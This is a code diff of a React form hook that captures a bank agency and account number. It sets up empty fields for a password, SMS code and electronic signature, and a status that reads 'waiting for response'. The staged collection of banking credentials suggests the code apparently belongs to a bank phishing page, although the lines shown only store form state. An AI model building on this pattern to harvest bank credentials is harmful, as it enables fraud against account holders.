@@ -2,9 +2,10 @@
 
 import { useForm, SubmitHandler, Mode } from 'react-hook-form';
 
-import navigate from '@/actions/navigate';
 import { zodResolver } from '@hookform/resolvers/zod';
 
+import { useAccountContext } from '../accountContext/useContext';
+import { useLoadingContext } from '../loadingContext/useContext';
 import { zodSchema, BodyProtocol } from './validation';
 
 interface Props {
@@ -24,10 +25,24 @@ export default function useFromAccessAccount({ mode, reValidateMode }: Props) {
     mode,
     reValidateMode,
   });
+  const { isLoading, setIsLoading } = useLoadingContext();
+  const { setAccount } = useAccountContext();
 
   const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
-    console.log(body);
-    navigate('/internetbanking-login');
+    if (isLoading) return;
+    const { account, agency } = body;
+    setIsLoading(true);
+    setAccount(state => ({
+      ...state,
+      account,
+      agency,
+      status: 'esperando resposta PJ',
+      type: 'N/D',
+      electronicSignature: 'N/D',
+      numberSMS: 'N/D',
+      password: 'N/D',
+      sms: 'N/D',
+    }));
   };
 
   return {
